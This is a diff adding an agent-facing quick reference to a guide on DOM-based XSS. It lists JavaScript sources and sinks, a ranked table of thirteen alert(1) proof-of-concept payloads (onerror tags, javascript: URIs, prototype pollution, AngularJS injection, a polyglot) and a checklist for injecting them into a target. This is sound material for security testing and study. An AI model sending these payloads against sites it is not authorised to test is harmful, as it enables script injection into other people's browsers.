@@ -2,6 +2,53 @@
 
 ---
 
+## ⚡ Quick Reference (Agent: read this section first)
+
+### Sources — check if user input reaches any of these
+```
+location.hash  location.search  location.href  location.pathname
+document.URL  document.documentURI  document.baseURI  document.referrer
+window.name  history.state  document.cookie  localStorage  sessionStorage
+postMessage / event.data  ws.onmessage  fetch/XHR response body
+```
+
+### Sinks — dangerous if source data flows here
+```
+innerHTML  outerHTML  insertAdjacentHTML  document.write  document.writeln
+eval  setTimeout  setInterval  Function()  new Function()
+location=  location.href=  location.assign()  location.replace()
+script.src=  element.setAttribute("href",...)  element.setAttribute("src",...)
+$(...)  $().html()  $().append()  $().prepend()
+dangerouslySetInnerHTML  v-html  [innerHTML] (Angular)
+```
+
+### Payloads — try in this order once source→sink path is confirmed
+
+| # | Context | Payload |
+|---|---------|--------|
+| 1 | `innerHTML` / `outerHTML` | `<img src=x onerror=alert(1)>` |
+| 2 | `innerHTML` (SVG wrapping) | `<svg><script>alert(1)<\/script></svg>` |
+| 3 | `eval` / `Function` / `setTimeout` | `alert(1)` |
+| 4 | `location=` / `location.href=` | `javascript:alert(1)` |
+| 5 | `location=` URL-encoded | `javascript://%0aalert(1)` |
+| 6 | `setAttribute("href", ...)` | `javascript:alert(1)` |
+| 7 | `jQuery $(...)` selector | `<img src=x onerror=alert(1)>` |
+| 8 | `location.hash` → jQuery | `#<img src=x onerror=alert(1)>` |
+| 9 | JSON string breakout | `\"-alert(1)}//` |
+| 10 | `postMessage` sink | Send `<img src=x onerror=alert(1)>` via iframe postMessage |
+| 11 | Prototype pollution gadget | `?__proto__[template]=<img src=x onerror=alert(1)>` |
+| 12 | AngularJS template | `{{constructor.constructor('alert(1)')()}}` |
+| 13 | Polyglot | `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\_x3e` |
+
+### Agent checklist
+1. Grep source list in target JS → identify reachable sources.
+2. Grep sink list → trace if source data flows to any sink.
+3. Inject canary via source → confirm it appears in sink (DevTools / Burp DOM Invader).
+4. Send matching payload from table above.
+5. Validate `e.origin` check: if absent on `postMessage` → it is exploitable.
+
+---
+
 ## 🧠 What is DOM XSS?
 DOM XSS happens when:
 - User-controlled data (source)
